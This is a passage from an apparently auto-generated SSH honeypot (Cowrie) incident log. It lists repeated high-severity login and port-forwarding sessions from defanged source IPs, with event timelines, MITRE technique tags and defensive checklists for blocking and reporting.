| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:31` | `cowrie.session.connect` |
| `2026-07-13 02:55:31` | `cowrie.login.success` |
| `2026-07-13 02:55:32` | `cowrie.session.params` |
| `2026-07-13 02:55:32` | `cowrie.log.closed` |
| `2026-07-13 02:55:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8df12d4211e

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:32` | `cowrie.session.connect` |
| `2026-07-13 02:55:32` | `cowrie.login.success` |
| `2026-07-13 02:55:33` | `cowrie.session.params` |
| `2026-07-13 02:55:33` | `cowrie.log.closed` |
| `2026-07-13 02:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d89b18c5384e

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:33` | `cowrie.session.connect` |
| `2026-07-13 02:55:33` | `cowrie.login.success` |
| `2026-07-13 02:55:33` | `cowrie.session.params` |
| `2026-07-13 02:55:33` | `cowrie.log.closed` |
| `2026-07-13 02:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de1f3d6438c0

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:33` | `cowrie.session.connect` |
| `2026-07-13 02:55:34` | `cowrie.login.success` |
| `2026-07-13 02:55:34` | `cowrie.session.params` |
| `2026-07-13 02:55:34` | `cowrie.log.closed` |
| `2026-07-13 02:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39af0f13a7b0

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:34` | `cowrie.session.connect` |
| `2026-07-13 02:55:34` | `cowrie.login.success` |
| `2026-07-13 02:55:35` | `cowrie.session.params` |
| `2026-07-13 02:55:35` | `cowrie.log.closed` |
| `2026-07-13 02:55:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec6d62dbdc81

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:35` | `cowrie.session.connect` |
| `2026-07-13 02:55:35` | `cowrie.login.success` |
| `2026-07-13 02:55:36` | `cowrie.session.params` |
| `2026-07-13 02:55:36` | `cowrie.log.closed` |
| `2026-07-13 02:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bd4d8132d18

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:36` | `cowrie.session.connect` |
| `2026-07-13 02:55:36` | `cowrie.login.success` |
| `2026-07-13 02:55:36` | `cowrie.session.params` |
| `2026-07-13 02:55:36` | `cowrie.log.closed` |
| `2026-07-13 02:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a60f29c659b5

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:36` | `cowrie.session.connect` |
| `2026-07-13 02:55:37` | `cowrie.login.success` |
| `2026-07-13 02:55:37` | `cowrie.session.params` |
| `2026-07-13 02:55:37` | `cowrie.log.closed` |
| `2026-07-13 02:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03d336025df0

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:37` | `cowrie.session.connect` |
| `2026-07-13 02:55:39` | `cowrie.login.success` |
| `2026-07-13 02:55:39` | `cowrie.session.params` |
| `2026-07-13 02:55:39` | `cowrie.log.closed` |
| `2026-07-13 02:55:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86eedf1fa0ec

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:39` | `cowrie.session.connect` |
| `2026-07-13 02:55:39` | `cowrie.login.success` |
| `2026-07-13 02:55:40` | `cowrie.session.params` |
| `2026-07-13 02:55:40` | `cowrie.log.closed` |
| `2026-07-13 02:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40d79ee9b952

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:40` | `cowrie.session.connect` |
| `2026-07-13 02:55:40` | `cowrie.login.success` |
| `2026-07-13 02:55:41` | `cowrie.session.params` |
| `2026-07-13 02:55:41` | `cowrie.log.closed` |
| `2026-07-13 02:55:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d372fcc700b4

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:41` | `cowrie.session.connect` |
| `2026-07-13 02:55:41` | `cowrie.login.success` |
| `2026-07-13 02:55:41` | `cowrie.session.params` |
| `2026-07-13 02:55:41` | `cowrie.log.closed` |
| `2026-07-13 02:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c74eb93e4af

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:42` | `cowrie.session.connect` |
| `2026-07-13 02:55:42` | `cowrie.login.success` |
| `2026-07-13 02:55:42` | `cowrie.session.params` |
| `2026-07-13 02:55:42` | `cowrie.log.closed` |
| `2026-07-13 02:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26e71898c928

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:42` | `cowrie.session.connect` |
| `2026-07-13 02:55:42` | `cowrie.login.success` |
| `2026-07-13 02:55:43` | `cowrie.session.params` |
| `2026-07-13 02:55:43` | `cowrie.log.closed` |
| `2026-07-13 02:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85ca95b34d00

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:43` | `cowrie.session.connect` |
| `2026-07-13 02:55:43` | `cowrie.login.success` |
| `2026-07-13 02:55:44` | `cowrie.session.params` |
| `2026-07-13 02:55:44` | `cowrie.log.closed` |
| `2026-07-13 02:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cb61a5b19a4

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:44` | `cowrie.session.connect` |
| `2026-07-13 02:55:44` | `cowrie.login.success` |
| `2026-07-13 02:55:45` | `cowrie.session.params` |
| `2026-07-13 02:55:45` | `cowrie.log.closed` |
| `2026-07-13 02:55:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09b4fed9896d

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:45` | `cowrie.session.connect` |
| `2026-07-13 02:55:45` | `cowrie.login.success` |
| `2026-07-13 02:55:45` | `cowrie.session.params` |
| `2026-07-13 02:55:45` | `cowrie.log.closed` |
| `2026-07-13 02:55:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf31e4150264

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:45` | `cowrie.session.connect` |
| `2026-07-13 02:55:45` | `cowrie.login.success` |
| `2026-07-13 02:55:46` | `cowrie.session.params` |
| `2026-07-13 02:55:46` | `cowrie.log.closed` |
| `2026-07-13 02:55:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee69a7f7b275

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:46` | `cowrie.session.connect` |
| `2026-07-13 02:55:46` | `cowrie.login.success` |
| `2026-07-13 02:55:47` | `cowrie.session.params` |
| `2026-07-13 02:55:47` | `cowrie.log.closed` |
| `2026-07-13 02:55:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99746b8c3dd2

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:47` | `cowrie.session.connect` |
| `2026-07-13 02:55:47` | `cowrie.login.success` |
| `2026-07-13 02:55:48` | `cowrie.session.params` |
| `2026-07-13 02:55:48` | `cowrie.log.closed` |
| `2026-07-13 02:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06cf565d1039

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:48` | `cowrie.session.connect` |
| `2026-07-13 02:55:48` | `cowrie.login.success` |
| `2026-07-13 02:55:48` | `cowrie.session.params` |
| `2026-07-13 02:55:48` | `cowrie.log.closed` |
| `2026-07-13 02:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51ac3ff554b2

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:48` | `cowrie.session.connect` |
| `2026-07-13 02:55:49` | `cowrie.login.success` |
| `2026-07-13 02:55:49` | `cowrie.session.params` |
| `2026-07-13 02:55:49` | `cowrie.log.closed` |
| `2026-07-13 02:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b2629ac46e1

| Field | Detail |
|---|---|
| **Source IP** | `210.13.99[.]66` |
| **First Seen** | 2026-07-13 02:57 |
| **Last Seen** | 2026-07-13 02:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:57:50` | `cowrie.session.connect` |
| `2026-07-13 02:57:50` | `cowrie.client.version` |
| `2026-07-13 02:57:50` | `cowrie.client.kex` |
| `2026-07-13 02:57:53` | `cowrie.login.success` |
| `2026-07-13 02:57:54` | `cowrie.direct-tcpip.request` |
| `2026-07-13 02:57:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.13.99[.]66` to AbuseIPDB if not already reported
- [ ] Block `210.13.99[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d91a72a44ac9

| Field | Detail |
|---|---|
| **Source IP** | `117.205.2[.]250` |
| **First Seen** | 2026-07-13 02:58 |
| **Last Seen** | 2026-07-13 02:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:58:03` | `cowrie.session.connect` |
| `2026-07-13 02:58:04` | `cowrie.client.version` |
| `2026-07-13 02:58:04` | `cowrie.client.kex` |
| `2026-07-13 02:58:06` | `cowrie.login.success` |
| `2026-07-13 02:58:07` | `cowrie.direct-tcpip.request` |
| `2026-07-13 02:58:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.205.2[.]250` to AbuseIPDB if not already reported
- [ ] Block `117.205.2[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6448eec67271

| Field | Detail |
|---|---|
| **Source IP** | `65.20.141[.]202` |
| **First Seen** | 2026-07-13 02:58 |
| **Last Seen** | 2026-07-13 02:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:58:31` | `cowrie.session.connect` |
| `2026-07-13 02:58:32` | `cowrie.client.version` |
| `2026-07-13 02:58:32` | `cowrie.client.kex` |
| `2026-07-13 02:58:33` | `cowrie.login.success` |
| `2026-07-13 02:58:34` | `cowrie.direct-tcpip.request` |
| `2026-07-13 02:58:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.141[.]202` to AbuseIPDB if not already reported
- [ ] Block `65.20.141[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1997b28b432

| Field | Detail |
|---|---|
| **Source IP** | `101.13.1[.]58` |
| **First Seen** | 2026-07-13 02:58 |
| **Last Seen** | 2026-07-13 02:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:58:39` | `cowrie.session.connect` |
| `2026-07-13 02:58:40` | `cowrie.client.version` |
| `2026-07-13 02:58:40` | `cowrie.client.kex` |
| `2026-07-13 02:58:42` | `cowrie.login.success` |
| `2026-07-13 02:58:42` | `cowrie.direct-tcpip.request` |
| `2026-07-13 02:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.1[.]58` to AbuseIPDB if not already reported
- [ ] Block `101.13.1[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9873910d95b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-13 02:58 |
| **Last Seen** | 2026-07-13 02:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:58:41` | `cowrie.session.connect` |
| `2026-07-13 02:58:41` | `cowrie.client.version` |
| `2026-07-13 02:58:41` | `cowrie.client.kex` |
| `2026-07-13 02:58:42` | `cowrie.login.success` |
| `2026-07-13 02:58:42` | `cowrie.direct-tcpip.request` |
| `2026-07-13 02:58:42` | `cowrie.direct-tcpip.data` |
| `2026-07-13 02:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8344af1ad0c6

| Field | Detail |
|---|---|
| **Source IP** | `110.227.213[.]163` |
| **First Seen** | 2026-07-13 03:05 |
| **Last Seen** | 2026-07-13 03:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:05:19` | `cowrie.session.connect` |
| `2026-07-13 03:05:20` | `cowrie.client.version` |
| `2026-07-13 03:05:20` | `cowrie.client.kex` |
| `2026-07-13 03:05:22` | `cowrie.login.success` |
| `2026-07-13 03:05:23` | `cowrie.direct-tcpip.request` |
| `2026-07-13 03:05:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.227.213[.]163` to AbuseIPDB if not already reported
- [ ] Block `110.227.213[.]163` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-020bbc2fc417

| Field | Detail |
|---|---|
| **Source IP** | `118.122.196[.]230` |
| **First Seen** | 2026-07-13 03:08 |
| **Last Seen** | 2026-07-13 03:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:08:32` | `cowrie.session.connect` |
| `2026-07-13 03:08:33` | `cowrie.client.version` |
| `2026-07-13 03:08:33` | `cowrie.client.kex` |
| `2026-07-13 03:08:35` | `cowrie.login.success` |
| `2026-07-13 03:08:36` | `cowrie.direct-tcpip.request` |
| `2026-07-13 03:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.196[.]230` to AbuseIPDB if not already reported
- [ ] Block `118.122.196[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f012aa546742

| Field | Detail |
|---|---|
| **Source IP** | `196.219.75[.]143` |
| **First Seen** | 2026-07-13 03:08 |
| **Last Seen** | 2026-07-13 03:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:08:41` | `cowrie.session.connect` |
| `2026-07-13 03:08:41` | `cowrie.client.version` |
| `2026-07-13 03:08:41` | `cowrie.client.kex` |
| `2026-07-13 03:08:42` | `cowrie.login.success` |
| `2026-07-13 03:08:43` | `cowrie.direct-tcpip.request` |
| `2026-07-13 03:08:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.219.75[.]143` to AbuseIPDB if not already reported
- [ ] Block `196.219.75[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f236d8d7d51

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 03:11 |
| **Last Seen** | 2026-07-13 03:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:11:49` | `cowrie.session.connect` |
| `2026-07-13 03:11:49` | `cowrie.client.version` |
| `2026-07-13 03:11:49` | `cowrie.client.kex` |
| `2026-07-13 03:11:50` | `cowrie.login.success` |
| `2026-07-13 03:11:51` | `cowrie.session.params` |
| `2026-07-13 03:11:51` | `cowrie.command.input` |
| `2026-07-13 03:11:51` | `cowrie.log.closed` |
| `2026-07-13 03:11:51` | `cowrie.session.closed` |

